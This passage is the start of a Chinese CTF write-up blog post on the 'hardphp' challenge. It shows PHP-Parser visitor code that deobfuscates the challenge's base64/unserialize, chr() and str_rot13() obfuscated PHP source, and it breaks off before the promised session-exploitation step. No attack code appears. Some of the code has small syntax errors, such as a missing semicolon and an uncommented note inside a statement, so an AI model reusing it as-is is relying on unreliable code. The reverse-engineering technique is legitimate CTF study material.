@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    高校战役hardphp复现 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-高校战“疫”hardphp复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      高校战役hardphp复现
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2020-03-29T03:48:46.000Z" itemprop="datePublished">2020-03-29</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>记录hardphp这道题复现过程，学习了Php-Parse进行混淆和解混淆和Session机制的另一种利用方式，如有不足，希望师傅们批评指正。</p>
+<a id="more"></a>
+
+<h1 id="0x01-解混淆"><a href="#0x01-解混淆" class="headerlink" title="0x01 解混淆"></a>0x01 解混淆</h1><p>拿到题目源码 ，是下图的格式，需要解混淆。</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329115420004.png" alt="image-20200329115420004"></p>
+<p>比赛结束后看了<a href="https://blog.zsxsoft.com/post/42" target="_blank" rel="noopener">zsh</a>师傅发的文章，知道正解是用Php-Parser来解混淆，文章里提出了一种通过Parse来进行代码混淆的方式，Parser是可以用来对php代码进行语法分析的工具，可以将php代码解析成抽象语法树，然后遍历语法树修改树上的节点，最后再将修改后的语法树转换为php代码。这样就可以达到一个混淆代码的作用。遍历抽象语法树需要用到Node visitors ,其相关用法如下图,去这里<a href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Walking_the_AST.markdown" target="_blank" rel="noopener">Walking the AST</a>详细看下，可能更好理解。</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329133214620.png" alt="image-20200329133214620"></p>
+<p>然后看题目中混淆代码的大致规则，可以看到每个php文件前面都是类似这样的结构</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[<span class="string">'�����'</span>]=unserialize(base64_decode(<span class="string">'xxxxxxxxxxxxxxx'</span>));</span><br><span class="line"></span><br><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]]=$GLOBALS[<span class="string">'�����'</span>][<span class="number">3</span>]($GLOBALS[<span class="string">'�����'</span>][<span class="number">2</span>]($GLOBALS[<span class="string">'�����'</span>][<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]][$GLOBALS[<span class="string">'�����'</span>][<span class="number">4</span>]+($GLOBALS[<span class="string">'�����'</span>][<span class="number">5</span>]-$GLOBALS[<span class="string">'�����'</span>][<span class="number">6</span>])]</span><br></pre></td></tr></table></figure>
+
+<p>可以知道<code>$GLOBALS[&#39;�����&#39;]</code>为一个数组，首先反向解出<code>$GLOBALS[&#39;�����&#39;]</code>如下图</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329121029339.png" alt="image-20200329121029339"></p>
+<p>可以看出<code>$GLOBALS[&#39;�����&#39;][1]</code>仍为一串base64编码的字符串，<code>$GLOBALS[&#39;�����&#39;][2]</code>为<code>base64_docode</code>，<code>$GLOBALS[&#39;�����&#39;][2]</code>为<code>unserialize</code>，<code>$GLOBALS[&#39;�����&#39;][3]</code>之后的值都为int型整数，然后分析上面代码的的第二句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]]=$GLOBALS[<span class="string">'�����'</span>][<span class="number">3</span>]($GLOBALS[<span class="string">'�����'</span>][<span class="number">2</span>]($GLOBALS[<span class="string">'�����'</span>][<span class="number">1</span>]));</span><br></pre></td></tr></table></figure>
+
+<p>将值代入后可以得出</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]]=unserialize(base64_decode($GLOBALS[<span class="string">'�����'</span>][<span class="number">1</span>]));</span><br></pre></td></tr></table></figure>
+
+<p>我们解出<code>$GLOBALS[$GLOBALS[&#39;�����&#39;][0]]</code>如下图</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329121724099.png" alt="image-20200329121724099"></p>
+<p><code>$GLOBALS[$GLOBALS[&#39;�����&#39;][0]]</code>仍然为数组，里面的值有字符串和int值；</p>
+<p>然后分析上面代码的第三句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[$GLOBALS[<span class="string">'�����'</span>][<span class="number">0</span>]][$GLOBALS[<span class="string">'�����'</span>][<span class="number">4</span>]+($GLOBALS[<span class="string">'�����'</span>][<span class="number">5</span>]-$GLOBALS[<span class="string">'�����'</span>][<span class="number">6</span>])]</span><br></pre></td></tr></table></figure>
+
+<p>将其中内容简写后如下图所示：</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329123658889.png" alt="image-20200329123658889"></p>
+<p>就是取<code>$GLOBALS[$GLOBALS[&#39;�����&#39;][0]]</code>数组中，对应索引为后面三个值相加减后的结果的值。然后我们开始解混淆，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span> <span class="params">($beforeFilename,$afterFilename)</span></span>&#123;</span><br><span class="line">    <span class="comment">///去掉数组</span></span><br><span class="line">    $parser = (<span class="keyword">new</span> ParserFactory())-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line">    $ast = $parser-&gt;parse(file_get_contents($beforeFilename));</span><br><span class="line">    $traverser = <span class="keyword">new</span> NodeTraverser();</span><br><span class="line">    $traverser-&gt;addVisitor(<span class="keyword">new</span> ArrayToConstant($parser));</span><br><span class="line">    $ast = $traverser-&gt;traverse($ast);</span><br><span class="line">    $prettyPrinter = <span class="keyword">new</span> Standard();</span><br><span class="line">    $ret = $prettyPrinter-&gt;prettyPrint($ast);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;?php "</span>.<span class="string">"\n"</span>.$ret</span><br><span class="line">    file_put_contents($afterFilename,<span class="string">'&lt;?php '</span> . <span class="string">"\n"</span> . $ret);</span><br><span class="line">&#125;</span><br><span class="line">decode(<span class="string">"./src/index.php"</span>,<span class="string">"decode.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///basejie.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayToConstant</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_variableName = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">private</span> $_constants = [];</span><br><span class="line">    <span class="keyword">private</span> $_constants2 = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">enterNode</span><span class="params">(Node $node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\Assign &amp;&amp;<span class="comment">//寻找unserialize(base64_decode())的节点</span></span><br><span class="line">            $node-&gt;expr <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;name <span class="keyword">instanceof</span> Node\Name &amp;&amp;</span><br><span class="line">            is_string($node-&gt;expr-&gt;name-&gt;parts[<span class="number">0</span>]) &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;name-&gt;parts[<span class="number">0</span>] == <span class="string">'unserialize'</span> &amp;&amp;</span><br><span class="line">            count($node-&gt;expr-&gt;args) === <span class="number">1</span> &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;args[<span class="number">0</span>] <span class="keyword">instanceof</span> Node\Arg &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name <span class="keyword">instanceof</span> Node\Name &amp;&amp;</span><br><span class="line">            is_string($node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name-&gt;parts[<span class="number">0</span>]) &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name-&gt;parts[<span class="number">0</span>] == <span class="string">'base64_decode'</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            $string = $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;args[<span class="number">0</span>]-&gt;value-&gt;value;</span><br><span class="line">            $array = unserialize(base64_decode($string));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_variableName = $node-&gt;var-&gt;dim-&gt;value;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_constants = $array;<span class="comment">//保存第一个数组</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_constants2 = unserialize(base64_decode($array[<span class="number">1</span>]));<span class="comment">//保存第二个数组</span></span><br><span class="line">            var_dump(<span class="keyword">$this</span>-&gt;_constants);</span><br><span class="line">            var_dump(<span class="keyword">$this</span>-&gt;_constants2);</span><br><span class="line">            <span class="comment">//var_dump($node-&gt;var-&gt;dim-&gt;value);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\Assign($node-&gt;var, Node\Scalar\LNumber::fromString(<span class="string">"0"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_variableName === <span class="string">''</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\ArrayDimFetch &amp;&amp; <span class="comment">//寻找x+(x-x)格式的节点</span></span><br><span class="line">            $node-&gt;var <span class="keyword">instanceof</span> Node\Expr\ArrayDimFetch &amp;&amp;  </span><br><span class="line">            $node-&gt;dim <span class="keyword">instanceof</span> PhpParser\Node\Expr\BinaryOp\Plus)</span><br><span class="line">            &#123;</span><br><span class="line">                $val1 = <span class="keyword">$this</span>-&gt;_constants[$node-&gt;dim-&gt;left-&gt;dim-&gt;value] + ((<span class="keyword">$this</span>-&gt;_constants[$node-&gt;dim-&gt;right-&gt;left-&gt;dim-&gt;value]) - (<span class="keyword">$this</span>-&gt;_constants[$node-&gt;dim-&gt;right-&gt;right-&gt;dim-&gt;value])); 计算数组的索引</span><br><span class="line">                <span class="comment">//var_dump($val1);</span></span><br><span class="line">                $val = <span class="keyword">$this</span>-&gt;_constants2[$val1];<span class="comment">//保存</span></span><br><span class="line">                <span class="comment">//var_dump($val);</span></span><br><span class="line">                <span class="keyword">if</span> (is_string($val)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\String_($val);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (is_double($val)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\DNumber($val);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (is_int($val)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\LNumber($val);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\ConstFetch(<span class="keyword">new</span> Node\Name\FullyQualified(json_encode($val)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后得到下图，可以看出已经去掉了之前的数组，但是还是不能看懂代码。</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329132029949.png" alt="image-20200329132029949"></p>
+<p>然后需要去掉str_rot13()和chr()函数，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///beauty.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BeautifyNodeVisitor</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varMap = [];</span><br><span class="line">    <span class="keyword">public</span> $argCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $localVarCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isUnreadable</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> === preg_match(<span class="string">'/\W/'</span>, $string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateArgName</span><span class="params">()</span>//按顺序生成函数参数名</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'arg'</span> . (<span class="keyword">$this</span>-&gt;argCount++);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateLocalVarName</span><span class="params">()</span>//按顺序生成变量名</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'v'</span> . (<span class="keyword">$this</span>-&gt;localVarCount++);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">enterNode</span><span class="params">(Node $node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\FuncCall  <span class="comment">//修改函数名 'chr' -&gt; chr ...</span></span><br><span class="line">            &amp;&amp; $node-&gt;name <span class="keyword">instanceof</span> Node\Scalar\String_) &#123;</span><br><span class="line">            $node-&gt;name = <span class="keyword">new</span> Node\Name($node-&gt;name-&gt;value);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\FunctionLike) &#123; <span class="comment">///重命名变量名</span></span><br><span class="line">            <span class="keyword">foreach</span> ($node-&gt;params <span class="keyword">as</span> $param) &#123;</span><br><span class="line">                $name = $param-&gt;var-&gt;name;</span><br><span class="line">                <span class="keyword">if</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;varMap)) &#123;</span><br><span class="line">                    $param-&gt;var-&gt;name = <span class="keyword">$this</span>-&gt;varMap[$name];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">self</span>::isUnreadable($name)) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;varMap[$name] = <span class="keyword">$this</span>-&gt;generateArgName();</span><br><span class="line">                    $param-&gt;var-&gt;name = <span class="keyword">$this</span>-&gt;varMap[$name];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       	<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp; <span class="comment">// 寻找有类似chr()特征的节点</span></span><br><span class="line">            $node-&gt;name <span class="keyword">instanceof</span> Node\Name &amp;&amp; </span><br><span class="line">            $node-&gt;name-&gt;parts[<span class="number">0</span>] == <span class="string">'chr'</span> &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Expr\BinaryOp\Plus &amp;&amp; </span><br><span class="line">            $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;left <span class="keyword">instanceof</span> Node\Scalar\LNumber  </span><br><span class="line">         ) &#123;</span><br><span class="line">            <span class="comment">//观察到chr参数都是类似 chr(x+(x-x))形式，然后分别提取其中的x</span></span><br><span class="line">            <span class="comment">//print_r($node-&gt;args[0]-&gt;value-&gt;left-&gt;value);</span></span><br><span class="line">            <span class="comment">//print_r($node-&gt;args[0]-&gt;value-&gt;right-&gt;left-&gt;value);</span></span><br><span class="line">            <span class="comment">//print_r($node-&gt;args[0]-&gt;value-&gt;right-&gt;right-&gt;value);</span></span><br><span class="line">            $value = $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;left-&gt;value + ($node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;right-&gt;left-&gt;value - $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;right-&gt;right-&gt;value);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\String_(chr($value));<span class="comment">//返回chr()后的值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//发现有的为chr(-x+(x-x))这种形式，Parse在解析的时候负数会解析成Node\Expr\UnaryMinus</span></span><br><span class="line">        <span class="comment">//然后同上面计算值返回</span></span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">            $node-&gt;name <span class="keyword">instanceof</span> Node\Name &amp;&amp;</span><br><span class="line">            $node-&gt;name-&gt;parts[<span class="number">0</span>] == <span class="string">'chr'</span> &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Expr\BinaryOp\Plus &amp;&amp; </span><br><span class="line">            $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;left <span class="keyword">instanceof</span>  Node\Expr\UnaryMinus</span><br><span class="line">         ) &#123;</span><br><span class="line">            <span class="comment">//print_r($node-&gt;args[0]-&gt;value-&gt;left-&gt;expr-&gt;value);</span></span><br><span class="line">            <span class="comment">//print_r($node-&gt;args[0]-&gt;value-&gt;right-&gt;left-&gt;value);</span></span><br><span class="line">            <span class="comment">//print_r($node-&gt;args[0]-&gt;value-&gt;right-&gt;right-&gt;value);</span></span><br><span class="line">            $value = <span class="number">0</span> - $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;left-&gt;expr-&gt;value + ( $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;right-&gt;left-&gt;value - $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;right-&gt;right-&gt;value );</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\String_(chr($value));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp; <span class="comment">//寻找有类似str_rot13()特征的节点</span></span><br><span class="line">            $node-&gt;name <span class="keyword">instanceof</span> Node\Name &amp;&amp;</span><br><span class="line">            $node-&gt;name-&gt;parts[<span class="number">0</span>] == <span class="string">'str_rot13'</span> &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>] <span class="keyword">instanceof</span> Node\Arg  </span><br><span class="line">        ) &#123;<span class="comment">//去掉 str_rot13</span></span><br><span class="line">            $val=<span class="string">""</span>;</span><br><span class="line">            $param=$node-&gt;args[<span class="number">0</span>]-&gt;value;</span><br><span class="line">            <span class="comment">//这里str_rot13()的参数是通过"."拼接的，如str_rot13("dd".("dd".("dd")))</span></span><br><span class="line">            <span class="comment">//然后这里按情况循环拼接str_rot13()的参数，最后返回计算后的值</span></span><br><span class="line">            <span class="keyword">if</span> ($param <span class="keyword">instanceof</span> Node\Scalar\String_)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\String_(str_rot13($param-&gt;value));</span><br><span class="line">            <span class="keyword">while</span> ($param <span class="keyword">instanceof</span> Node\Expr\BinaryOp\Concat)&#123;</span><br><span class="line">                $val.=$param-&gt;left-&gt;value;</span><br><span class="line">                $param=$param-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">            $val.=$param-&gt;value;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\String_(str_rot13($val));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\Variable) &#123; <span class="comment">//修改变量名</span></span><br><span class="line">            $name = $node-&gt;name;</span><br><span class="line">            <span class="keyword">if</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;varMap)) &#123;</span><br><span class="line">                $node-&gt;name = <span class="keyword">$this</span>-&gt;varMap[$name];</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">self</span>::isUnreadable($name)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varMap[$name] = <span class="keyword">$this</span>-&gt;generateLocalVarName();</span><br><span class="line">                $node-&gt;name = <span class="keyword">$this</span>-&gt;varMap[$name];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//发现解混淆后为('call_user_func_array')('call_user_func_array', $v3);</span></span><br><span class="line">		<span class="comment">//所以修改函数名 call_user_array()</span></span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp; </span><br><span class="line">        	$node-&gt;name <span class="keyword">instanceof</span> Node\Scalar\String_) &#123;</span><br><span class="line">            $node-&gt;name = <span class="keyword">new</span> Node\Name($node-&gt;name-&gt;value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果为下图，可以大致看清代码含义，但是这里面把函数调用格式改了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">realpath(<span class="string">"./"</span>)</span><br><span class="line"><span class="comment">//变成了</span></span><br><span class="line">$v1 = [<span class="string">'realpath'</span>, $v0];</span><br><span class="line">call_user_func_array(<span class="string">'call_user_func_array'</span>, $v1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329135750383.png" alt="image-20200329135750383"></p>
+<p>这里需要把上面的函数格式变成便于我们理解的格式，然后在测试Model.php时</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329141145384.png" alt="image-20200329141145384"></p>
+<p>看到里面有<code>-1 + (1 - 1) + (1 + (5 - 2) - (-1 + (4 - 1)))</code>这种格式的数据，还有涉及到函数的嵌套。</p>
+<p>首先解决<code>-1 + (1 - 1) + (1 + (5 - 2) - (-1 + (4 - 1)))</code>这种格式的数据，在分析这种语句的语法树时，</p>
